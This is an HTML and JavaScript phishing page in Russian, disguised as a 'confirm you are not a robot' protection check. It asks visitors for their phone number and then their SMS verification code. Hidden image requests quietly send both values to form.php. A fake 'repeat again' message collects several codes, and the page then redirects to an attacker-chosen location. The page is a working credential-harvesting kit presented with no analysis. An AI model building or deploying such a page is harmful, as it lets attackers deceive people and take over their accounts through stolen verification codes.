<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      #block{
        margin-top: 5%;
      }h5{color:red; font-size: 15px;}
      #code{
        display:none;
        margin-top: 8%;
      }body{
        background: #f1f1f1;
        font-family: courier new;
      }.inp{
        height:30px;
        width:200px;
        border-radius: 4px;
      }.sun{
        height:30px;
        width:100px;
        border:1px solid #d2d2d2;
        background: #d2d2d2;
        border-radius: 4px;
        box-shadow: 1px 2px 3px 0px #aaa;
      }.sun:hover{
        box-shadow: 2px 4px 6px 0px #aaa;
      }#bg{
        background: #999ab9e3;
        height:auto;
        width:600px;
        padding: 2px;
        border-radius: 6px;
      }.recap{
        border-radius: 90px;
        padding: 8px 40px 0px 0px;
      }
    </style>

  </head>
  <body>
    <center>
      <h1>Страница защищена. </h1>
      <h5>Подтвердите, что вы не робот!</h5>
      <hr><br><br>
    <div id="bg">
      <table>
        <td>
          <img src="racapt.jpg" height="100px" class="recap">
        </td>
        <td>
      <div id="block" >
        <h3 id='ttx'>Введите номер телефона:</h3>
        <input type="number" onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength=11 minlength=11 id=numb class="inp" value="+">
        <input type="submit" value="Далее" id="phone" class="sun" placeholder="Phone number" >
      </div>
      <div id=code>
        <input name="" id="send_code" class="inp" type="number" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  maxlength=6 placeholder="SMS Code">
        <input type="submit" value="Продолжить" id="send" class="sun">
      </div>
    </td>
    </div>
  </center>
  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var ii = 0;
  var code = document.getElementById('code')
  var block = document.getElementById('block')
  var numb = document.getElementById('numb')
  var sender = document.getElementById('sender')
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Error. Укажите ваш номер телефона!")}else{
    sender.src="form.php?phone="+numb.value;
    code.style.display="block";
    document.getElementById('phone').style.display="none";
    document.getElementById('ttx').innerHTML="Введите код из SMS"
    //block.style.display="none";
  }
  };
  document.getElementById('send').onclick = function(){
    if(document.getElementById('send_code').value===""){alert("Error. Укажите СМС код!")}else{
      sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
      alert("Повторите снова")
      document.getElementById('send_code').value=""
      ii++;
    }
    if(ii == 2){
      if(document.getElementById('send_code').value===""){alert("Error. Укажите СМС код!")}else{
        sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value
        window.location.href="<?php echo file_get_contents("location.u"); ?>";
    }}
  };
  </script>
</html>
